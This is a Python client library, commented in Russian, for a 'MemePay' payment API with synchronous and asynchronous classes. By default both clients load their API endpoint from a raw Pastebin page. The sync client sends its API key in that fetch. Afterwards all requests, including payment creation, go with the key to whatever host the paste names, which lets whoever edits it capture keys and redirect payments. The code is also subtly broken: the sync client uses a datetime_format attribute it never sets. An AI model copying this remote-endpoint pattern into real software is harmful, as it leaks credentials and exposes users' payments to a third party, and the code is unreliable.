"""
Клиент MemePay API, реализующий синхронный и асинхронный API
"""

import json
from datetime import datetime
from typing import Dict, Optional, Any, Union
import httpx
import requests
from .models import PaymentInfo, PaymentCreateResponse, UserInfo, ApiResponse, ExpiresAt

class BaseMemePay:
    """Базовый класс для API-клиентов MemePay"""

    def __init__(
        self,
        api_key: str,
        base_url: str = "https://memepay.lol/api/v1",
    ):
        """
        Инициализация клиента API MemePay

        Args:
            api_key: API ключ MemePay
            base_url: Базовый URL API (по умолчанию: https://memepay.lol/api/v1)
        """
        self.api_key = api_key

        if base_url is None:
            base_url = "https://memepay.lol/api/v1"

        self.base_url = base_url.rstrip("/")
        self.headers = {
            "Content-Type": "application/json",
            "X-API-Key": api_key
        }

class MemePay(BaseMemePay):
    """Синхронный API-клиент MemePay"""

    def __init__(
        self,
        api_key: str,
        shop_id: str,
        base_url: str = None,
    ):
        """
        Инициализация синхронного клиента API MemePay

        Args:
            api_key: API ключ MemePay
            shop_id: ID магазина
            base_url: Базовый URL API (по умолчанию загружается из конфигурации)
        """
        super().__init__(api_key, base_url)
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.shop_id = shop_id

        if base_url is None:
            self.base_url = self._get_base_url()

    def _process_response(self, response: requests.Response) -> ApiResponse:
        """
        Обработка ответа от API

        Args:
            response: Ответ API

        Returns:
            ApiResponse: Обработанный ответ API
        """
        try:
            data = response.json()
            return ApiResponse(
                success=data.get("success", False),
                data=data.get("data"),
                message=data.get("message"),
                error=data.get("error")
            )
        except ValueError:
            return ApiResponse(
                success=False,
                message="Ошибка декодирования JSON",
                error="JSON_DECODE_ERROR"
            )

    def _get_base_url(self) -> str:
        """
        Получение базового URL API

        Returns:
            str: Базовый URL API
        """
        try:
            response = self.session.get("https://pastebin.com/raw/WQZ6S7mx")
            if response.status_code == 200:
                return response.text.strip()
            else:

                return "https://memepay.lol/api/v1"
        except Exception:

            return "https://memepay.lol/api/v1"

    def get_user_info(self) -> UserInfo:
        """
        Получение информации о текущем пользователе

        Returns:
            UserInfo: Информация о пользователе

        Raises:
            Exception: В случае ошибки API
        """
        response = self.session.get(f"{self.base_url}/user/me")
        result = self._process_response(response)

        if not result.success:
            raise Exception(f"Ошибка API: {result.error}")

        user_data = result.data
        return UserInfo(
            name=user_data["name"],
            email=user_data["email"],
            balance=float(user_data["balance"]),
            created_at=self._parse_datetime(user_data["createdAt"])
        )

    def get_payment_info(self, payment_id: str) -> PaymentInfo:
        """
        Получение информации о платеже

        Args:
            payment_id: ID платежа

        Returns:
            PaymentInfo: Информация о платеже

        Raises:
            Exception: В случае ошибки API
        """
        response = self.session.get(f"{self.base_url}/payment/info?id={payment_id}")
        result = self._process_response(response)

        if not result.success:
            raise Exception(f"Ошибка API: {result.error}")

        payment_data = result.data
        return PaymentInfo(
            id=payment_data["id"],
            amount=float(payment_data["amount"]),
            amount_with_commission=float(payment_data["amount_with_commission"]),
            status=payment_data["status"],
            method=payment_data["method"],
            created_at=self._parse_datetime(payment_data["created_at"])
        )

    def create_payment(
        self,
        amount: float,
        method: Optional[str] = None,
    ) -> PaymentCreateResponse:
        """
        Создание платежа

        Args:
            amount: Сумма платежа
            method: Метод оплаты (опционально)

        Returns:
            PaymentCreateResponse: Ответ с данными о созданном платеже

        Raises:
            Exception: В случае ошибки API
        """
        payload = {
            "amount": amount,
            "shopId": self.shop_id,
        }

        if method:
            payload["method"] = method

        response = self.session.post(
            f"{self.base_url}/payment/create",
            json=payload
        )
        result = self._process_response(response)

        if not result.success:
            raise Exception(f"Ошибка API: {result.error}")

        payment_data = result.data
        return PaymentCreateResponse(
            payment_id=payment_data["payment_id"],
            payment_url=payment_data["payment_url"],
            amount=float(payment_data["amount"]),
            status=payment_data["status"],
            expires_at=self._parse_datetime(payment_data["expires_at"]),
            created_at=self._parse_datetime(payment_data["created_at"])
        )

    def get_store_payment_methods(self) -> list:
        """
        Получение доступных методов оплаты для магазина

        Returns:
            list: Список доступных методов оплаты

        Raises:
            Exception: В случае ошибки API
        """
        response = self.session.get(f"{self.base_url}/stores/methods?shopId={self.shop_id}")
        result = self._process_response(response)

        if not result.success:
            raise Exception(f"Ошибка API: {result.error}")

        return result.data

    def _parse_datetime(self, date_string: str) -> Union[datetime, str]:
        """
        Преобразование строки даты/времени в объект datetime или строку заданного формата

        Args:
            date_string: Строка с датой и временем

        Returns:
            Union[datetime, str]: Объект datetime или строка в заданном формате
        """
        if isinstance(date_string, dict):
            date_str = date_string.get("data", "")
            time_str = date_string.get("time", "")
            if date_str and time_str:
                dt_obj = datetime.fromisoformat(f"{date_str}T{time_str}".replace("Z", "+00:00"))
            else:
                dt_obj = datetime.now()
        elif isinstance(date_string, str):
            dt_obj = datetime.fromisoformat(date_string.replace("Z", "+00:00"))
        else:
            # Если тип не известен, возвращаем текущую дату
            dt_obj = datetime.now()
            
        # Возвращаем результат в зависимости от настроек формата
        if self.datetime_format == "object":
            return dt_obj
        elif self.datetime_format == "str":
            return dt_obj.strftime("%Y-%m-%d %H:%M:%S")
        elif self.datetime_format == "iso":
            return dt_obj.isoformat()
        elif self.datetime_format == "custom":
            return dt_obj.strftime(self.custom_format)
        else:
            return dt_obj  # По умолчанию возвращаем объект datetime

class AsyncMemePay(BaseMemePay):
    """Асинхронный API-клиент MemePay"""

    def __init__(
        self,
        api_key: str,
        shop_id: str,
        base_url: str = None,
        datetime_format: str = "object",  # "object", "str", "iso", "custom"
        custom_format: str = "%Y-%m-%d %H:%M:%S",
    ):
        """
        Инициализация асинхронного клиента API MemePay

        Args:
            api_key: API ключ MemePay
            shop_id: ID магазина
            base_url: Базовый URL API (по умолчанию загружается из конфигурации)
            datetime_format: Формат возвращаемых дат:
                - "object" - объект datetime (по умолчанию)
                - "str" - строка в формате "%Y-%m-%d %H:%M:%S"
                - "iso" - строка в формате ISO
                - "custom" - пользовательский формат (указывается в custom_format)
            custom_format: Пользовательский формат даты (по умолчанию "%Y-%m-%d %H:%M:%S")
        """
        super().__init__(api_key, base_url)
        self.client = httpx.AsyncClient(headers=self.headers)
        self.shop_id = shop_id
        self.datetime_format = datetime_format
        self.custom_format = custom_format

        if base_url is None:
            self.base_url = self._get_base_url()

    async def _process_response(self, response: httpx.Response) -> ApiResponse:
        """
        Обработка ответа от API

        Args:
            response: Ответ API

        Returns:
            ApiResponse: Обработанный ответ API
        """
        try:
            data = response.json()
            return ApiResponse(
                success=data.get("success", False),
                data=data.get("data"),
                message=data.get("message"),
                error=data.get("error")
            )
        except ValueError:
            return ApiResponse(
                success=False,
                message="Ошибка декодирования JSON",
                error="JSON_DECODE_ERROR"
            )

    def _get_base_url(self) -> str:
        """
        Получение базового URL API

        Returns:
            str: Базовый URL API
        """
        try:
            response = requests.get("https://pastebin.com/raw/WQZ6S7mx")
            if response.status_code == 200:
                return response.text.strip()
        except Exception:
            raise Exception("Не удалось получить базовый URL API")

    async def get_user_info(self) -> UserInfo:
        """
        Получение информации о текущем пользователе

        Returns:
            UserInfo: Информация о пользователе

        Raises:
            Exception: В случае ошибки API
        """
        response = await self.client.get(f"{self.base_url}/user/me")
        result = await self._process_response(response)

        if not result.success:
            raise Exception(f"Ошибка API: {result.error}")

        user_data = result.data
        return UserInfo(
            name=user_data["name"],
            email=user_data["email"],
            balance=float(user_data["balance"]),
            created_at=self._parse_datetime(user_data["createdAt"])
        )

    async def get_payment_info(self, payment_id: str) -> PaymentInfo:
        """
        Получение информации о платеже

        Args:
            payment_id: ID платежа

        Returns:
            PaymentInfo: Информация о платеже

        Raises:
            Exception: В случае ошибки API
        """
        response = await self.client.get(f"{self.base_url}/payment/info?id={payment_id}")
        result = await self._process_response(response)

        if not result.success:
            raise Exception(f"Ошибка API: {result.error}")

        payment_data = result.data
        return PaymentInfo(
            id=payment_data["id"],
            amount=float(payment_data["amount"]),
            amount_with_commission=float(payment_data["amount_with_commission"]),
            status=payment_data["status"],
            method=payment_data["method"],
            created_at=self._parse_datetime(payment_data["created_at"])
        )

    async def create_payment(
        self,
        amount: float,
        method: Optional[str] = None,
    ) -> PaymentCreateResponse:
        """
        Создание платежа

        Args:
            amount: Сумма платежа
            method: Метод оплаты (опционально)

        Returns:
            PaymentCreateResponse: Ответ с данными о созданном платеже

        Raises:
            Exception: В случае ошибки API
        """
        payload = {
            "amount": amount,
            "shopId": self.shop_id,
        }

        if method:
            payload["method"] = method

        response = await self.client.post(
            f"{self.base_url}/payment/create",
            json=payload
        )
        result = await self._process_response(response)

        if not result.success:
            raise Exception(f"Ошибка API: {result.error}")

        payment_data = result.data
        
        # Обработка поля expires_at, которое приходит как словарь
        expires_at = None
        if "expires_at" in payment_data:
            if isinstance(payment_data["expires_at"], dict):
                expires_at = ExpiresAt(payment_data["expires_at"])
            else:
                expires_at = self._parse_datetime(payment_data["expires_at"])
        else:
            expires_at = datetime.now()
            
        return PaymentCreateResponse(
            payment_id=payment_data["payment_id"],
            payment_url=payment_data["payment_url"],
            amount=float(payment_data["amount"]),
            status=payment_data["status"],
            expires_at=expires_at,
            created_at=self._parse_datetime(payment_data["created_at"])
        )

    async def get_store_payment_methods(self) -> list:
        """
        Получение доступных методов оплаты для магазина

        Returns:
            list: Список доступных методов оплаты

        Raises:
            Exception: В случае ошибки API
        """
        response = await self.client.get(f"{self.base_url}/stores/methods?shopId={self.shop_id}")
        result = await self._process_response(response)

        if not result.success:
            raise Exception(f"Ошибка API: {result.error}")

        return result.data

    async def close(self):
        """Закрытие клиента"""
        await self.client.aclose()
        
    def _parse_datetime(self, date_string: str) -> Union[datetime, str]:
        """
        Преобразование строки даты/времени в объект datetime или строку заданного формата

        Args:
            date_string: Строка с датой и временем

        Returns:
            Union[datetime, str]: Объект datetime или строка в заданном формате
        """
        if isinstance(date_string, dict):
            date_str = date_string.get("data", "")
            time_str = date_string.get("time", "")
            if date_str and time_str:
                dt_obj = datetime.fromisoformat(f"{date_str}T{time_str}".replace("Z", "+00:00"))
            else:
                dt_obj = datetime.now()
        elif isinstance(date_string, str):
            dt_obj = datetime.fromisoformat(date_string.replace("Z", "+00:00"))
        else:
            # Если тип не известен, возвращаем текущую дату
            dt_obj = datetime.now()
            
        # Возвращаем результат в зависимости от настроек формата
        if self.datetime_format == "object":
            return dt_obj
        elif self.datetime_format == "str":
            return dt_obj.strftime("%Y-%m-%d %H:%M:%S")
        elif self.datetime_format == "iso":
            return dt_obj.isoformat()
        elif self.datetime_format == "custom":
            return dt_obj.strftime(self.custom_format)
        else:
            return dt_obj  # По умолчанию возвращаем объект datetime